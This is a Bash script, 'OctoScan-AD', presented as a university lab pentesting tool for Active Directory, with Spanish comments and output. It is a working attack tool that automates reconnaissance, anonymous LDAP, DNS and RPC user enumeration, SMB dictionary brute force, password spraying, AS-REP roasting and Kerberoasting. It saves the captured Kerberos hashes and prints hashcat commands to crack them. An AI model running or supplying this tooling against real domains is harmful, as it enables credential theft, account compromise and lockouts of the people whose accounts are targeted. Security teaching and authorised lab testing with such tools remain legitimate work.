#!/bin/bash
# ============================================================
#   🐙 OctoScan-AD — Herramienta de Pentesting para AD
#   Laboratorio universitario — uso educativo
# ============================================================

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
WHITE='\033[1;37m'
BOLD='\033[1m'
NC='\033[0m'

TARGET=""
DOMAIN=""
USERS_FILE=""
PASSWORDS_FILE=""
TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
OUTPUT_DIR=""
REPORT_FILE=""

banner() {
    clear
    echo -e "${CYAN}"
    echo "  ██████╗  ██████╗████████╗ ██████╗ ███████╗ ██████╗ █████╗ ███╗   ██╗      █████╗ ██████╗ "
    echo " ██╔═══██╗██╔════╝╚══██╔══╝██╔═══██╗██╔════╝██╔════╝██╔══██╗████╗  ██║     ██╔══██╗██╔══██╗"
    echo " ██║   ██║██║        ██║   ██║   ██║███████╗██║     ███████║██╔██╗ ██║     ███████║██║  ██║"
    echo " ██║   ██║██║        ██║   ██║   ██║╚════██║██║     ██╔══██║██║╚██╗██║     ██╔══██║██║  ██║"
    echo " ╚██████╔╝╚██████╗   ██║   ╚██████╔╝███████║╚██████╗██║  ██║██║ ╚████║     ██║  ██║██████╔╝"
    echo "  ╚═════╝  ╚═════╝   ╚═╝    ╚═════╝ ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝     ╚═╝  ╚═╝╚═════╝ "
    echo -e "${NC}"
    echo -e "${MAGENTA}  🐙 OctoScan-AD | Pentesting para Active Directory${NC}"
    echo -e "${WHITE}  ──────────────────────────────────────────────────${NC}"
    echo -e "${YELLOW}  ⚠️  Solo para laboratorios autorizados${NC}"
    echo -e "${WHITE}  ──────────────────────────────────────────────────${NC}"
    echo -e "  \033[2;37mcreado por: sayo${NC}"
    echo ""
}

log_info()    { echo -e "${CYAN}[*]${NC} $1";  echo "[INFO] $1" >> "$REPORT_FILE" 2>/dev/null; }
log_success() { echo -e "${GREEN}[+]${NC} $1"; echo "[OK]   $1" >> "$REPORT_FILE" 2>/dev/null; }
log_warn()    { echo -e "${YELLOW}[!]${NC} $1"; echo "[WARN] $1" >> "$REPORT_FILE" 2>/dev/null; }
log_error()   { echo -e "${RED}[-]${NC} $1";   echo "[ERR]  $1" >> "$REPORT_FILE" 2>/dev/null; }
log_section() {
    echo ""
    echo -e "${BOLD}${BLUE}══════════════════════════════════════════${NC}"
    echo -e "${BOLD}${WHITE}  🔍 $1${NC}"
    echo -e "${BOLD}${BLUE}══════════════════════════════════════════${NC}"
    echo ""
    echo -e "\n========================================\n  $1\n========================================" >> "$REPORT_FILE" 2>/dev/null
}

# ─── Solo pide IP y ruta de guardado ────────────────────────
pedir_target() {
    echo -e "${WHITE}${BOLD}  Configuración${NC}"
    echo -e "${WHITE}  ──────────────────────────────────────────${NC}"
    echo ""

    # IP del objetivo
    while true; do
        read -p "$(echo -e ${CYAN}"  [?] IP del servidor objetivo: "${NC})" TARGET
        if [[ $TARGET =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
            break
        else
            log_error "IP inválida, intenta de nuevo"
        fi
    done

    # Ruta donde guardar resultados
    echo ""
    echo -e "  ${YELLOW}¿Dónde quieres guardar los resultados?${NC}"
    echo -e "  ${WHITE}Ejemplos: /root/Desktop  /home/kali  /tmp${NC}"
    echo ""
    while true; do
        read -p "$(echo -e ${CYAN}"  [?] Ruta de guardado: "${NC})" BASE_DIR
        BASE_DIR="${BASE_DIR/#\~/$HOME}"
        if [ -d "$BASE_DIR" ]; then
            break
        else
            log_error "La ruta no existe: $BASE_DIR"
            echo -e "  ${YELLOW}Tip:${NC} Verifica que la carpeta exista"
        fi
    done

    # Nombre personalizado de la carpeta
    echo ""
    echo -e "  ${YELLOW}Nombre para la carpeta de resultados${NC}"
    echo -e "  ${WHITE}Se creará como: octoscan_results_[tu nombre]${NC}"
    echo ""
    read -p "$(echo -e ${CYAN}"  [?] Nombre: "${NC})" FOLDER_NAME
    # Si no pone nada, usar timestamp
    if [ -z "$FOLDER_NAME" ]; then
        FOLDER_NAME="${TIMESTAMP}"
    fi
    # Quitar espacios y caracteres raros
    FOLDER_NAME=$(echo "$FOLDER_NAME" | tr ' ' '_' | tr -cd '[:alnum:]_-')

    OUTPUT_DIR="$BASE_DIR/octoscan_results_${FOLDER_NAME}"
    REPORT_FILE="$OUTPUT_DIR/reporte_final.txt"

    if mkdir -p "$OUTPUT_DIR" 2>/dev/null; then
        log_success "Carpeta creada: $OUTPUT_DIR"
    else
        log_error "Sin permisos en $BASE_DIR — intenta con /tmp"
        OUTPUT_DIR="/tmp/octoscan_results_${FOLDER_NAME}"
        REPORT_FILE="$OUTPUT_DIR/reporte_final.txt"
        mkdir -p "$OUTPUT_DIR"
        log_warn "Usando ruta alternativa: $OUTPUT_DIR"
    fi

    echo "OctoScan-AD | Target: $TARGET | $(date)" > "$REPORT_FILE"
    echo ""
    log_success "Target: $TARGET"
    log_info "Resultados en: $OUTPUT_DIR"
    echo ""
}

# ─── Detecta dominio solo cuando lo necesita ────────────────
detectar_dominio() {
    if [ -z "$DOMAIN" ]; then
        log_info "Detectando dominio automáticamente..."
        DOMAIN=$(ldapsearch -x -H "ldap://$TARGET" -s base 2>/dev/null \
            | grep "defaultNamingContext" \
            | sed 's/.*DC=\([^,]*\),DC=\([^,]*\).*/\1.\2/' \
            | head -1)

        if [ -n "$DOMAIN" ]; then
            log_success "Dominio detectado: $DOMAIN"
        else
            log_warn "No se pudo detectar el dominio automáticamente"
            read -p "$(echo -e ${CYAN}"  [?] Introduce el dominio (ej: Technova.com): "${NC})" DOMAIN
        fi
    fi
}

# ─── Pide diccionarios solo cuando se necesitan ─────────────
pedir_diccionarios() {
    echo ""
    echo -e "${WHITE}  ──────────────────────────────────────────${NC}"
    echo -e "${CYAN}  Este módulo requiere diccionarios${NC}"
    echo -e "${WHITE}  ──────────────────────────────────────────${NC}"
    echo ""

    if [ -z "$USERS_FILE" ]; then
        while true; do
            read -p "$(echo -e ${CYAN}"  [?] Archivo de usuarios (ej: /root/users.txt): "${NC})" USERS_FILE
            if [ -f "$USERS_FILE" ]; then
                log_success "Usuarios: $(wc -l < "$USERS_FILE") entradas cargadas"
                break
            else
                log_error "No encontrado: $USERS_FILE"
            fi
        done
    fi

    if [ -z "$PASSWORDS_FILE" ]; then
        while true; do
            read -p "$(echo -e ${CYAN}"  [?] Archivo de contraseñas (ej: /root/passwords.txt): "${NC})" PASSWORDS_FILE
            if [ -f "$PASSWORDS_FILE" ]; then
                log_success "Contraseñas: $(wc -l < "$PASSWORDS_FILE") entradas cargadas"
                break
            else
                log_error "No encontrado: $PASSWORDS_FILE"
                echo -e "  ${YELLOW}Tip:${NC} Puedes usar /usr/share/wordlists/rockyou.txt"
            fi
        done
    fi
    echo ""
}

# ─── MÓDULO 1: NMAP ─────────────────────────────────────────
modulo_nmap() {
    log_section "MÓDULO 1 — Escaneo de Puertos (NMAP)"
    local out="$OUTPUT_DIR/01_nmap.txt"

    log_info "Escaneando $TARGET..."
    nmap -sV -sC --open \
        -p 53,88,135,139,389,443,445,464,593,636,3268,3269,5985,5986,9389 \
        "$TARGET" -oN "$out" 2>/dev/null

    echo ""
    log_info "Puertos críticos:"
    for entry in "445:SMB" "135:RPC" "139:NetBIOS" "5985:WinRM" "5986:WinRM-SSL"; do
        p="${entry%%:*}"; n="${entry##*:}"
        if grep -q "$p/tcp.*open" "$out" 2>/dev/null; then
            log_warn "Puerto $p ($n) — ABIERTO ⚠️"
        else
            log_success "Puerto $p ($n) — filtrado ✓"
        fi
    done

    cat "$out" >> "$REPORT_FILE"
    log_success "Completado → $out"
}

# ─── MÓDULO 2: LDAP ─────────────────────────────────────────
modulo_ldap() {
    log_section "MÓDULO 2 — Reconocimiento LDAP"
    local out="$OUTPUT_DIR/02_ldap.txt"

    detectar_dominio

    log_info "Consultando LDAP anónimo..."
    ldapsearch -x -H "ldap://$TARGET" -s base > "$out" 2>&1

    if grep -q "result: 0 Success" "$out"; then
        log_warn "LDAP anónimo responde — información expuesta:"
        grep -E "dnsHostName|defaultNamingContext|domainFunctionality" "$out" \
            | while read l; do log_warn "  → $l"; done
    else
        log_success "LDAP anónimo bloqueado ✓"
    fi

    cat "$out" >> "$REPORT_FILE"
    log_success "Completado → $out"
}

# ─── MÓDULO 3: DNS ───────────────────────────────────────────
modulo_dns() {
    log_section "MÓDULO 3 — Enumeración DNS"
    local out="$OUTPUT_DIR/03_dns.txt"

    detectar_dominio

    log_info "Intentando transferencia de zona para $DOMAIN..."
    dig axfr "$DOMAIN" @"$TARGET" > "$out" 2>&1

    if grep -qE "Transfer failed|REFUSED|connection refused" "$out"; then
        log_success "Transferencia de zona bloqueada ✓"
    else
        log_warn "¡Transferencia de zona exitosa! Datos del dominio expuestos"
    fi

    cat "$out" >> "$REPORT_FILE"
    log_success "Completado → $out"
}

# ─── MÓDULO 4: RPC ───────────────────────────────────────────
modulo_rpc() {
    log_section "MÓDULO 4 — Enumeración RPC"
    local out="$OUTPUT_DIR/04_rpc.txt"

    log_info "Intentando RPC anónimo en $TARGET..."
    result=$(rpcclient -U "" -N "$TARGET" -c "enumdomusers" 2>/dev/null)

    if echo "$result" | grep -q "user:"; then
        log_warn "¡RPC anónimo activo! Usuarios expuestos:"
        echo "$result" | tee "$out"
    else
        log_success "RPC anónimo bloqueado ✓"
        echo "RPC bloqueado" > "$out"
    fi

    cat "$out" >> "$REPORT_FILE"
    log_success "Completado → $out"
}

# ─── MÓDULO 5: SMB Bruteforce ────────────────────────────────
modulo_smb_bruteforce() {
    log_section "MÓDULO 5 — Ataque de Diccionario SMB"
    local out="$OUTPUT_DIR/05_smb_bruteforce.txt"

    pedir_diccionarios

    if ! command -v netexec &>/dev/null; then
        log_error "netexec no disponible — instala con: sudo apt install netexec"
        return
    fi

    log_warn "Lockout activo en 5 intentos por cuenta"
    log_info "Iniciando ataque contra $TARGET..."
    netexec smb "$TARGET" -u "$USERS_FILE" -p "$PASSWORDS_FILE" \
        --continue-on-success 2>/dev/null | tee "$out"

    echo ""
    if grep -q "\[+\]" "$out"; then
        log_success "¡Credenciales válidas encontradas!"
        grep "\[+\]" "$out" | while read l; do log_success "  → $l"; done
        grep -i "pwn3d\|admin" "$out" | while read l; do log_warn "  🔥 ADMIN: $l"; done
    else
        log_success "No se encontraron credenciales válidas ✓"
    fi

    cat "$out" >> "$REPORT_FILE"
    log_success "Completado → $out"
}

# ─── MÓDULO 6: AS-REP Roasting ───────────────────────────────
modulo_asrep() {
    log_section "MÓDULO 6 — AS-REP Roasting"
    local out="$OUTPUT_DIR/06_asrep.txt"

    detectar_dominio
    pedir_diccionarios

    if ! command -v impacket-GetNPUsers &>/dev/null; then
        log_error "impacket-GetNPUsers no disponible"
        return
    fi

    log_info "Buscando cuentas sin preautenticación Kerberos..."
    impacket-GetNPUsers "$DOMAIN/" -dc-ip "$TARGET" \
        -no-pass -usersfile "$USERS_FILE" 2>/dev/null | tee "$out"

    if grep -q "\$krb5asrep\$" "$out"; then
        log_warn "¡Hash AS-REP obtenido! Guardando..."
        grep "\$krb5asrep\$" "$out" > "$OUTPUT_DIR/hashes_asrep.txt"
        log_info "Crackear: hashcat -m 18200 $OUTPUT_DIR/hashes_asrep.txt /usr/share/wordlists/rockyou.txt"
    else
        log_success "Ninguna cuenta vulnerable ✓"
    fi

    cat "$out" >> "$REPORT_FILE"
    log_success "Completado → $out"
}

# ─── MÓDULO 7: Kerberoasting ─────────────────────────────────
modulo_kerberoasting() {
    log_section "MÓDULO 7 — Kerberoasting"
    local out="$OUTPUT_DIR/07_kerberoasting.txt"

    detectar_dominio
    pedir_diccionarios

    if ! command -v impacket-GetUserSPNs &>/dev/null; then
        log_error "impacket-GetUserSPNs no disponible"
        return
    fi

    log_info "Buscando SPNs vulnerables con credenciales válidas..."
    local encontrado=0

    while IFS= read -r user && [ $encontrado -eq 0 ]; do
        while IFS= read -r pass && [ $encontrado -eq 0 ]; do
            result=$(impacket-GetUserSPNs "$DOMAIN/$user:$pass" \
                -dc-ip "$TARGET" -request 2>/dev/null)
            if echo "$result" | grep -qv "invalidCredentials\|KDC_ERR\|Error"; then
                log_success "Credencial válida: $user:$pass"
                echo "$result" > "$out"
                if echo "$result" | grep -q "\$krb5tgs\$"; then
                    log_warn "¡Hash TGS obtenido!"
                    grep "\$krb5tgs\$" "$out" > "$OUTPUT_DIR/hashes_kerberoast.txt"
                    log_info "Crackear: hashcat -m 13100 $OUTPUT_DIR/hashes_kerberoast.txt /usr/share/wordlists/rockyou.txt"
                else
                    log_success "No hay SPNs vulnerables ✓"
                fi
                encontrado=1
            fi
        done < "$PASSWORDS_FILE"
    done < "$USERS_FILE"

    [ $encontrado -eq 0 ] && log_error "No se encontraron credenciales válidas"
    cat "$out" >> "$REPORT_FILE" 2>/dev/null
    log_success "Completado → $out"
}

# ─── MÓDULO 8: Password Spraying ────────────────────────────
modulo_spray() {
    log_section "MÓDULO 8 — Password Spraying"
    local out="$OUTPUT_DIR/08_spray.txt"

    detectar_dominio
    pedir_diccionarios

    if ! command -v kerbrute &>/dev/null; then
        log_warn "kerbrute no instalado"
        log_info "Instalar: wget https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_linux_amd64 -O /usr/local/bin/kerbrute && chmod +x /usr/local/bin/kerbrute"
        return
    fi

    log_warn "⚠️  Lockout en 5 intentos — 1 contraseña por ronda"
    while IFS= read -r pass; do
        log_info "Probando: $pass"
        kerbrute passwordspray -d "$DOMAIN" --dc "$TARGET" "$USERS_FILE" "$pass" 2>/dev/null | tee -a "$out"
        sleep 1
    done < "$PASSWORDS_FILE"

    cat "$out" >> "$REPORT_FILE"
    log_success "Completado → $out"
}

# ─── REPORTE FINAL ───────────────────────────────────────────
reporte_final() {
    log_section "REPORTE FINAL"
    echo ""
    echo -e "${WHITE}${BOLD}  📊 Resumen — $TARGET${NC}"
    echo -e "${WHITE}  ──────────────────────────────────────────${NC}"
    echo ""

    local v=0 s=0

    verificar() {
        local nombre=$1 archivo=$2 patron=$3 malo=$4
        [ ! -f "$archivo" ] && echo -e "  ${YELLOW}[N/A]${NC}        $nombre" && return
        if grep -qE "$patron" "$archivo" 2>/dev/null; then
            [ "$malo" = "1" ] && { echo -e "  ${RED}[VULNERABLE]${NC} $nombre"; ((v++)); } \
                              || { echo -e "  ${GREEN}[SEGURO]${NC}     $nombre"; ((s++)); }
        else
            [ "$malo" = "1" ] && { echo -e "  ${GREEN}[SEGURO]${NC}     $nombre"; ((s++)); } \
                              || { echo -e "  ${RED}[VULNERABLE]${NC} $nombre"; ((v++)); }
        fi
    }

    verificar "Puertos SMB/RPC/WinRM abiertos" "$OUTPUT_DIR/01_nmap.txt"           "445/tcp open|135/tcp open|5985/tcp open" "1"
    verificar "LDAP anónimo expuesto"           "$OUTPUT_DIR/02_ldap.txt"           "result: 0 Success"                       "1"
    verificar "DNS Zone Transfer bloqueado"     "$OUTPUT_DIR/03_dns.txt"            "Transfer failed|REFUSED"                 "0"
    verificar "RPC anónimo"                     "$OUTPUT_DIR/04_rpc.txt"            "user:"                                   "1"
    verificar "Credenciales SMB débiles"        "$OUTPUT_DIR/05_smb_bruteforce.txt" "\[\+\]"                                  "1"
    verificar "AS-REP Roasting"                 "$OUTPUT_DIR/06_asrep.txt"          "krb5asrep"                               "1"
    verificar "Kerberoasting"                   "$OUTPUT_DIR/07_kerberoasting.txt"  "krb5tgs"                                 "1"

    echo ""
    echo -e "  ${RED}${BOLD}Vulnerabilidades: $v${NC}"
    echo -e "  ${GREEN}${BOLD}Seguros:          $s${NC}"
    echo ""
    echo -e "${WHITE}  ──────────────────────────────────────────${NC}"
    echo -e "${GREEN}  📁 $OUTPUT_DIR${NC}"
    echo -e "${GREEN}  📄 $REPORT_FILE${NC}"
    echo ""

    echo -e "\nRESUMEN: Vulnerabilidades=$v | Seguros=$s | $(date)" >> "$REPORT_FILE"
}

# ─── MENÚ ────────────────────────────────────────────────────
menu() {
    while true; do
        echo ""
        echo -e "${WHITE}${BOLD}  ¿Qué deseas hacer?${NC}"
        echo -e "  ${CYAN}Target actual: ${GREEN}$TARGET${NC}  ${CYAN}Carpeta: ${GREEN}$(basename $OUTPUT_DIR)${NC}"
        echo ""
        echo -e "  ${CYAN}[1]${NC} Reconocimiento     ${YELLOW}(NMAP + LDAP + DNS)${NC}        solo necesita IP"
        echo -e "  ${CYAN}[2]${NC} Enumeración RPC    ${YELLOW}(rpcclient)${NC}                solo necesita IP"
        echo -e "  ${CYAN}[3]${NC} Ataque diccionario ${YELLOW}(SMB bruteforce)${NC}           pide diccionarios"
        echo -e "  ${CYAN}[4]${NC} AS-REP Roasting    ${YELLOW}(Kerberos sin preauth)${NC}     pide diccionarios"
        echo -e "  ${CYAN}[5]${NC} Kerberoasting      ${YELLOW}(SPNs)${NC}                     pide diccionarios"
        echo -e "  ${CYAN}[6]${NC} Password Spraying  ${YELLOW}(kerbrute)${NC}                 pide diccionarios"
        echo -e "  ${CYAN}[7]${NC} Todo completo      ${YELLOW}(todos los módulos)${NC}"
        echo -e "  ${CYAN}[8]${NC} Nuevo scan         ${YELLOW}(cambiar IP y carpeta)${NC}"
        echo -e "  ${CYAN}[0]${NC} Salir"
        echo ""
        read -p "$(echo -e ${CYAN}"  [?] Opción: "${NC})" opcion
        echo ""

        case $opcion in
            1) modulo_nmap; modulo_ldap; modulo_dns; reporte_final ;;
            2) modulo_rpc; reporte_final ;;
            3) modulo_smb_bruteforce; reporte_final ;;
            4) modulo_asrep; reporte_final ;;
            5) modulo_kerberoasting; reporte_final ;;
            6) modulo_spray; reporte_final ;;
            7)
                modulo_nmap; modulo_ldap; modulo_dns; modulo_rpc
                modulo_smb_bruteforce; modulo_asrep; modulo_kerberoasting; modulo_spray
                reporte_final ;;
            8)
                # Resetear variables para nuevo scan
                TARGET=""; DOMAIN=""; USERS_FILE=""; PASSWORDS_FILE=""
                TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
                OUTPUT_DIR=""; REPORT_FILE=""
                banner
                pedir_target
                ;;
            0)
                echo -e "${CYAN}  Saliendo...${NC}"
                echo -e "${WHITE}  Resultados guardados en: $OUTPUT_DIR${NC}"
                echo ""
                exit 0
                ;;
            *) log_error "Opción inválida" ;;
        esac
    done
}

# ─── INICIO ──────────────────────────────────────────────────
banner
pedir_target
menu
